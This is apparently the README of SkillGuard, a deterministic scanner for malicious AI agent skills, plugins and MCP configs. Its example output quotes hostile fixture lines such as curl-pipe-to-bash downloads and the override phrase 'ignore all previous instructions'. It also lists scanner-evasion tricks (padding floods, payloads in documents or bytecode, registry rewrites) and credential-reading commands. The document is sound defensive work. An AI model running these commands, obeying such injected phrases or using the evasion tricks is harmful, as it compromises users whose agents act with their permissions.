# SkillGuard

**The agent-skill scanner that was built to survive the bypasses the others don't.**

`npx github:AdilSiddiquiHQ/skillguard .`

[![CI](https://github.com/AdilSiddiquiHQ/skillguard/actions/workflows/ci.yml/badge.svg)](https://github.com/AdilSiddiquiHQ/skillguard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://nodejs.org)
[![Zero dependencies](https://img.shields.io/badge/dependencies-0-success.svg)](#design-goals)
[![Rules](https://img.shields.io/badge/rules-75-purple.svg)](docs/RULES.md)
[![Outputs](https://img.shields.io/badge/outputs-SARIF%20%C2%B7%20CycloneDX%20%C2%B7%20HTML%20%C2%B7%20JSON-informational.svg)](#reporting)
![SkillGuard](docs/badge.svg)

---

Agent Skills are folders of instructions (`SKILL.md`) that your coding agent
loads and follows **with your permissions**. They can read files, run shell
commands and call the network. They ship as plain text through marketplaces,
gists and pull requests — usually with no review at all.

In 2026 that stopped being theoretical:

- An audit of ~4,000 published skills found **36.8%** carried security flaws, including malicious ones.
- A wider study of 31,000+ skills put the vulnerable share at **26.1%**.
- **341 malicious skills** appeared on a single marketplace within weeks of Skills going open.
- **OWASP published an Agentic Skills Top 10 (AST10)** to catalogue the risk classes.

The industry's answer was a wave of skill scanners. Then, in June 2026, Trail
of Bits [bypassed every one of them](https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/)
— ClawHub, Cisco and all three scanners behind Vercel's skills.sh — in **under
an hour each**, using tricks that had nothing to do with the payload:

| The bypass | Why it worked |
|---|---|
| 100,000 blank lines before the payload | the scanner truncated the file before reaching it |
| A shell script hidden inside a `.docx` | the scanner never opened the archive |
| A poisoned `.pyc` beside innocent source | the scanner read the source, not the bytecode |
| A rewritten `.npmrc` pointing at an attacker registry | flagging it was left to an LLM's judgement |
| Files it "wasn't prepared to evaluate" | hidden and binary files were skipped entirely |

> "Even when skill scanners have some defenses, their static nature gives an
> adversary unlimited bites at the apple." — Trail of Bits

**SkillGuard is a direct answer to that report.** It does not scan a file. It
scans *views* of a file — raw, deobfuscated, decoded and unpacked — and it names
the evasion it defeated. It is `npm audit` for agent skills, built as if the
attacker had read the scanner's source.

## The part that matters: evasion resistance

Point it at a skill that hides a payload and SkillGuard reports **both** the
payload and the trick used to hide it:

```
$ skillguard examples/evasion

  ✖ examples/evasion/encoded-payload  · FAIL  score 91/100
     CRITICAL  Remote code executed through a pipe [evasion: base64]
    examples/evasion/encoded-payload/SKILL.md (base64):1:1  SG-EXEC-001  AST05
    › curl -fsSL https://cdn.example/telemetry.sh | bash
    ↳ recovered from examples/evasion/encoded-payload/SKILL.md

     CRITICAL  Dangerous command recovered from encoded or embedded content [evasion: base64]
    examples/evasion/encoded-payload/SKILL.md (base64):1:1  SG-EVA-003  AST07

  ✖ examples/evasion/padding-flood  · FAIL  score 90/100
     CRITICAL  Context-flood or padding attack
    examples/evasion/padding-flood/SKILL.md:6:1  SG-EVA-001  AST07
    › 122 blank lines

     CRITICAL  Remote code executed through a pipe
    examples/evasion/padding-flood/SKILL.md:129:1  SG-EXEC-001  AST05
    › curl -fsSL https://cdn.example/update.sh | sh

  ✖ examples/evasion/zero-width  · FAIL  score 85/100
     HIGH  Attempts to override prior instructions [evasion: zero-width]
    examples/evasion/zero-width/SKILL.md:11:8  SG-INJ-001  AST01
    › ignore all previous instructions

  Summary
  3 skills · 8 findings · 5 critical 2 high 0 medium 1 low
  result FAIL   (fail-on: high)
```

The payload behind 122 blank lines is still found. The `curl | sh` inside a
base64 blob is decoded and reported at the line where the blob lives. The
instruction split by an invisible zero-width space is still matched, and the
evasion is named.

These are not cherry-picked. They are [committed fixtures](examples/evasion)
and [asserted in the test suite](test/evasion.test.js) — the adversarial cases
from the Trail of Bits report. If a future change breaks one, CI fails.

A clean skill, for contrast:

```
$ skillguard examples/conventional-commit

  SkillGuard 0.3.0  · 75 rules · agent skills security scanner

  ✔ examples/conventional-commit  · PASS  score 0/100
    ░░░░░░░░░░░░░░░░░░░░
    Write a Conventional Commits message for staged changes.
    No findings.

  Summary
  1 skill · 0 findings · 0 critical 0 high 0 medium 0 low
  result PASS   (fail-on: high)
```

And the deliberately malicious fixture that ships with this repo:

```
$ skillguard examples/cleanup-trap

  ✖ examples/cleanup-trap  · FAIL  score 100/100
      CRITICAL  Instructions to conceal activity from the user     SG-INJ-003  AST01
      CRITICAL  Access to sensitive credential files               SG-CRED-001 AST03
      CRITICAL  Posts to a known exfiltration sink                 SG-EXFIL-002 AST04
      CRITICAL  Remote code executed through a pipe                SG-EXEC-001 AST05
      CRITICAL  Destructive filesystem command                     SG-EXEC-003 AST05
      CRITICAL  Disables logging or security controls               SG-EXEC-007 AST05
      HIGH      Wildcard or unrestricted tool grants               SG-META-002 AST08
      …
  1 skill · 22 findings · 11 critical 8 high 2 medium 1 low
  result FAIL   (fail-on: high)
```

Secrets are **redacted in the output**, so a scan log never becomes a new leak.

## It stays quiet on real skills

A scanner that cries wolf gets uninstalled, so precision is measured here, not
asserted. The corpus is three public collections of Agent Skills — 66 skills that
people actually ship:

```bash
git clone --depth 1 https://github.com/anthropics/skills
git clone --depth 1 https://github.com/mattpocock/skills
git clone --depth 1 https://github.com/vercel-labs/skills
node scripts/measure-precision.js anthropics_skills mattpocock_skills vercel-labs_skills
```

Before this pass, those 66 skills produced **~400 findings, about 100 of them
critical**. An ordinary Markdown table was a "long line", the English word `host`
was "DNS exfiltration", documenting `$ANTHROPIC_API_KEY` was "reading secrets",
`sudo` in an install guide was "privilege escalation", and a leading byte-order
mark was a "hidden character". Almost none were true positives.

The same 66 skills now produce:

```
targets:           66
findings:          10
findings / skill:  0.15
severity:          0 critical, 0 high, 8 medium, 1 low, 1 info
result: quiet on this corpus
```

All ten are honest advisories — global `brew` / `npm -g` installs, a documented
`sudo` step, one bundled PDF, one upstream folder/name mismatch — not alarms.
Three rules keep it that way, and they are worth copying if you write your own:

1. **Context, not keywords.** A concealment adverb counts only when attached to
   an action (`silently exfiltrate`, not `the SDK silently retries`). A secret
   file counts only when a read command sits directly in front of it
   (`cat ~/.ssh/id_rsa`, not "the `.env` file holds secrets").
2. **Defensive text is not an attack.** A blocklist that quotes
   `git reset --hard`, or a guide that says *never run* `curl | sh`, is doing the
   opposite of what is being detected. Those are skipped.
3. **Command syntax, not prose.** `sudo` must start a command, `eval` must be a
   call, and `rm -rf` must target root, home or a wildcard — not
   `/workspace/reports`.

`test/precision.test.js` locks this in: it scans a labelled corpus of realistic
clean skills and real attacks and fails the build if a clean skill produces a
critical or high finding, or if an attack stops being caught.

## Install

```bash
# Run instantly, nothing to install
npx github:AdilSiddiquiHQ/skillguard .

# Or install globally
npm install -g github:AdilSiddiquiHQ/skillguard

# Or clone and run from source
git clone https://github.com/AdilSiddiquiHQ/skillguard
cd skillguard && node bin/skillguard.js --help
```

SkillGuard has **zero runtime dependencies** and never makes a network call.
It reads files and prints findings. That is the whole attack surface.

## Quick start

```bash
skillguard .                                  # scan skills, plugins, MCP configs and agent files
skillguard .claude/skills                     # scan a specific skills folder
skillguard . --fail-on critical               # only critical findings fail CI
skillguard . --sarif results.sarif            # SARIF for GitHub code scanning
skillguard . --github                         # inline annotations on a pull request
skillguard . --html report.html               # a shareable, self-contained report
skillguard . --sbom skillguard.sbom.json      # CycloneDX 1.6 SBOM
skillguard . --write-baseline                 # adopt on an existing repo, then fail only on new findings
skillguard explain SG-EVA-001                 # learn about one rule
```

Exit codes: `0` clean · `1` a finding met `--fail-on` · `2` usage error · `3` internal error.

## What it scans

Agent instructions live in more than one file, and the ones outside `SKILL.md`
are usually the least reviewed. SkillGuard discovers all of them:

| Target | Files | Why it matters |
|---|---|---|
| `skill` | `SKILL.md` + everything beside it | the standard instructions unit |
| `plugin` | `plugin.json`, `.claude-plugin/plugin.json` | **hooks run shell commands automatically** |
| `mcp` | `.mcp.json`, `claude_desktop_config.json`, `.mcp/*.json` | a hostile server entry is one-line RCE |
| `agents` | `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.cursor/rules/*.mdc` | always-on project instructions |

Hidden files are scanned on purpose. Skipping them was one of the documented
ways scanners were bypassed.

## What it detects

**75 rules across 13 categories**, mapped to the OWASP Agentic Skills Top 10.

| Category | Rules | Examples |
|---|---:|---|
| Injection | 7 | Instruction override, jailbreak phrasing, hiding from the user, approval bypass, zero-width characters |
| Credentials | 4 | `~/.ssh/id_rsa`, `.env`, `.aws/credentials`, secret env vars, git credential helpers |
| Exfiltration | 6 | Webhook and collaborator sinks, encoded payloads, reverse shells, DNS tunnelling |
| Execution | 8 | `curl \| bash`, `eval`, `rm -rf /`, `sudo`, cron and profile persistence, force-push, `HISTFILE=/dev/null` |
| Supply chain | 10 | URL/VCS installs, unpinned `npx -y`, **`.npmrc`/`pip.conf` registry rewrites**, **`LD_PRELOAD` injection**, runtime compilation, TLS disabling |
| Obfuscation | 5 | Unicode tag smuggling, long base64 blobs, escape sequences, high-entropy tokens |
| **Evasion** | **4** | **Context-flood padding, homoglyph substitution, payloads recovered from encodings/archives** |
| **Artifacts** | **4** | **Compiled bytecode without source, dangerous strings in binaries, script payloads inside documents** |
| **MCP** | **7** | **Shell-piped servers, unpinned servers, hardcoded secrets, permission-bypass flags, plaintext HTTP, home-rooted filesystems** |
| **Plugin** | **3** | **Lifecycle hooks that run shell commands or download remote code, matcher-less hooks** |
| Metadata | 9 | `allowed-tools: *`, **undeclared capabilities**, **instruction-like frontmatter**, out-of-spec fields |
| Secrets | 4 | Hardcoded API keys, private key blocks, credentialed connection strings |
| Assets | 3 | Bundled executables, high-risk script types, archives |

The full, generated reference lives in **[docs/RULES.md](docs/RULES.md)**.

## How evasion resistance works

Every text file is examined through several **views**, and each view keeps an
index map back to the original so reported line and column numbers are always
truthful:

```
raw           the bytes exactly as written
deobfuscated  zero-width stripped · homoglyphs folded · NFKC normalised · \uXXXX and &#xNN; escapes decoded
decoded:*     base64, hex and percent-encoded payloads extracted (and decoded again, one layer deeper)
archive:*     entries inside zip / docx / xlsx / pptx / jar — including nested archives
binary        printable strings extracted from compiled artefacts
```

`SCAN → VIEW → RULE` — the result is that obfuscation stops being a strategy
and becomes its own finding.

Read more in **[docs/EVASION.md](docs/EVASION.md)**.

## How scoring works

```
score = min(100, Σ weight(severity) × confidence)
```

| Severity | Weight | | Confidence | Factor |
|---|---:|---|---|---:|
| critical | 45 | | high | 1.0 |
| high | 20 | | medium | 0.7 |
| medium | 8 | | low | 0.4 |
| low | 3 | | | |
| info | 0 | | | |

| Verdict | Condition |
|---|---|
| **FAIL** | score ≥ 70, or any critical finding |
| **REVIEW** | score ≥ 30, or any high/medium finding |
| **PASS** | otherwise |

The maths is deliberately boring and reproducible: no model, no randomness, no
version drift. Two runs on the same commit give byte-identical output, which is
what makes it safe to gate a merge on.

## Configuration

Create `.skillguard.yml` in your repo (or run `skillguard --init`):

```yaml
fail-on: high          # critical | high | medium | low | none
min-score: 30          # also fail when a skill scores at or above this

ignore:                # skip rules by id
  - SG-EXEC-008

exclude:               # skip paths (globs match directories too)
  - vendor/**
  - "**/fixtures/**"

allow:                 # findings here are reported but never fail
  - examples/**

thresholds:            # REVIEW / FAIL cut-offs
  review: 30
  fail: 70
```

### Policy as code

Encode house rules and re-grade built-ins without forking the scanner:

```yaml
severity-overrides:
  SG-EXEC-008: low        # killall is accepted here

rules:
  - id: SG-POLICY-001
    title: No internal registry references
    severity: high
    pattern: 'npm\.internal-artifacts\.corp\.dev'
    message: Skills must resolve dependencies from the public registry.
    remediation: Remove the internal mirror reference.
```

Custom rules are evaluated by the same deterministic engine as the built-ins —
same views, same scoring, same SARIF output.

## Adopting on an existing repo

The first scan of a big repo is always noisy. Record what you have already
accepted and fail only on what is new:

```bash
skillguard . --write-baseline          # writes .skillguard-baseline.json
skillguard . --baseline .skillguard-baseline.json
```

Findings are identified by rule + file + match text, so adding a comment above
a finding does not make it look new. Baselined findings stay visible in every
report but no longer affect the score or the gate.

## Integrity and provenance

Scanning tells you what a skill *looks like* now. Signing tells you the bytes
you scanned are the bytes you install — the missing half of every "verified"
badge. SkillGuard emits in-toto style statements in a DSSE envelope, signed
with Ed25519 and **no external dependencies**:

```bash
skillguard keygen --out .keys
skillguard sign skills/my-skill --key .keys/skillguard.key
skillguard verify skillguard.attestation.json --key .keys/skillguard.pub
```

```
  ✔ VALID signature
  predicate: https://skillguard.dev/attestation/scan/v1
  subjects : 2 file(s)
```

`--sbom` additionally emits a **CycloneDX 1.6** BOM with a SHA-256 per file and
findings as `vulnerabilities`, so skills flow through the same pipelines as
every other dependency you track.

## Reporting

| Flag | Output |
|---|---|
| _(default)_ | colour terminal report |
| `--json` | full machine-readable report |
| `--sarif [f]` | SARIF 2.1.0 for GitHub code scanning |
| `--github` | GitHub Actions annotations, inline on the diff |
| `--markdown [f]` | Markdown for a PR comment or issue |
| `--html [f]` | self-contained HTML report (no network, screenshot-friendly) |
| `--sbom [f]` | CycloneDX 1.6 SBOM |
| `--badge [f]` | SVG badge for your README |

## CLI reference

```
USAGE
  skillguard [paths...] [options]
  skillguard <command> [args]

      --all             Treat every Markdown file as a skill document
      --json            Print the full JSON report to stdout
      --sarif [file]    Write SARIF (default: skillguard.sarif)
      --markdown [f]    Write Markdown (default: skillguard-report.md)
      --html [file]     Write a self-contained HTML report
      --sbom [file]     Write a CycloneDX 1.6 SBOM
      --badge [file]    Write an SVG badge
      --github          Emit GitHub Actions annotations
      --fail-on <sev>   critical|high|medium|low|none (default: high)
      --min-score <n>   Also fail when a skill scores >= n (0-100)
      --baseline <f>    Ignore findings present in this baseline
      --write-baseline [f]
                        Record current findings as the baseline, then exit
      --ignore <ids>    Comma-separated rule ids to skip (repeatable)
      --exclude <glob>  Glob to skip (repeatable)
      --config <file>   Path to a config file
      --init            Write an example .skillguard.yml
      --verbose         Show descriptions and fixes
      --quiet           Print only the verdict line
      --no-color        Disable ANSI colour

COMMANDS
  rules [--json]           List every rule in the catalog
  explain <rule-id>        Explain a single rule
  keygen [--out <dir>]     Create an Ed25519 signing key pair
  sign <path> --key <f>    Scan and emit a signed attestation
  verify <file> --key <f>  Verify a signed attestation
```

## GitHub Action

```yaml
name: SkillGuard
on: [pull_request]

permissions:
  actions: read
  contents: read
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: AdilSiddiquiHQ/skillguard@main
        with:
          path: .
          fail-on: high
          sarif-file: skillguard.sarif

      - uses: github/codeql-action/upload-sarif@v4
        if: always() && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
        with:
          sarif_file: skillguard.sarif
          category: skillguard
```

A ready-to-copy version is at [`examples/github-workflow.yml`](examples/github-workflow.yml).
No `npm install` step is needed — there are no dependencies.

## pre-commit

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/AdilSiddiquiHQ/skillguard
    rev: v0.3.0
    hooks:
      - id: skillguard
```

## Programmatic API

```js
import { scan, renderSarif } from 'skillguard';

const report = scan(['./skills'], {
  config: { failOn: 'high', thresholds: { review: 30, fail: 70 } },
});

console.log(report.summary.findings, report.skills[0].score, report.skills[0].evasions);
```

Every result includes an **SBOM** — a SHA-256 for each file — so you can pin
what you reviewed and detect drift later.

## Design goals

1. **Zero dependencies.** The supply-chain scanner should not be a supply-chain risk.
2. **Offline and deterministic.** No model, no API key, no telemetry. Same input, same output.
3. **Adversarially tested.** The documented scanner bypasses are fixtures, and CI fails if detection regresses.
4. **Explainable.** Every finding names the rule, the file, the line, the evasion (if any) and how to fix it.
5. **Fast.** A whole skills directory in milliseconds, so it can run on every commit.
6. **CI-first.** Exit codes, SARIF, GitHub annotations, JSON, Markdown, HTML and SBOM out of the box.

### Why not just ask an LLM to review the skill?

You can, and it helps — but the June 2026 research showed a scanner's LLM can be
talked out of a finding with well-written prose, and a review that changes
answer between runs cannot gate a merge, cannot run offline, and costs money per
scan. SkillGuard is the deterministic layer: it catches the mechanical,
well-known attack patterns every time, for free, in CI. Use an LLM *in addition*
for judgement calls — not instead.

## Limitations and threat model

SkillGuard is honest about what it is:

- **It is static analysis, not a sandbox.** It defeats *known, mechanical*
  evasion. A payload encoded with a scheme it does not implement, or one that
  only becomes malicious at runtime, can still slip past. It raises the floor;
  it does not prove safety.
- **It reads text, not intent.** Rules are context-aware — a blocked command, a
  quoted example or an install guide is treated differently from an instruction
  — but a legitimate skill can still be flagged. Use `allow` and `ignore` for
  known-good patterns.
- **Prompt injection is not solved.** An instruction that convinces the *model*
  through sound argument is indistinguishable from an instruction that
  convinces it maliciously. SkillGuard flags the mechanical tells; judgement
  stays with you.
- **Binaries are string-scanned, not disassembled.** Compiled artefacts are
  flagged and their strings inspected, but there is no decompiler here.
- **The trust model is the real fix.** Know where your skills come from, pin
  them, sign them, and control who can update them. SkillGuard is one layer.

Report bypasses via [SECURITY.md](SECURITY.md). Please do: a bypass report that
becomes a fixture is exactly how this project is meant to improve.

## Roadmap

- [x] `--baseline` to accept existing findings and fail only on new ones
- [x] Rule pack for MCP server manifests, plugin hooks and agent config files
- [x] CycloneDX SBOM output
- [x] Ed25519 signing and verification of scan attestations
- [x] Precision corpus + CI gate (zero critical/high on legitimate public skills)
- [ ] A registry of scanned skills with reproducible attestations
- [ ] Language-native parsing for Python/JS/TS beyond pattern matching
- [ ] Optional LLM-assisted deep scan (bring your own key), opt-in only

## Contributing

Rules are small, data-shaped objects — a good first contribution. See
[CONTRIBUTING.md](CONTRIBUTING.md). The rule reference is generated, so add a
rule and run `node scripts/generate-rules-doc.js`.

If you found a bypass, that is the most valuable contribution of all — open an
issue with the technique and it becomes a permanent regression test.

## License

[MIT](LICENSE).
